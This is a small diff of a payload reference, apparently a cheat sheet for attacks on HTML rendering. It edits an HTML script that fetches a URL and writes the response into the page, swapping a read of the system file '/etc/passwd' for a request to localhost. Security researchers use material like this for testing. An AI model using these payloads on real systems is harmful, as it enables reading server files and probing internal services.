@@ -188,7 +188,7 @@ Code: html
 	x.onload = function(){
 		document.write(this.responseText)
 	};
-	x.open("GET", "file:///etc/passwd");
+	x.open("GET", "http://localhost");
 	x.send();
 </script>
 
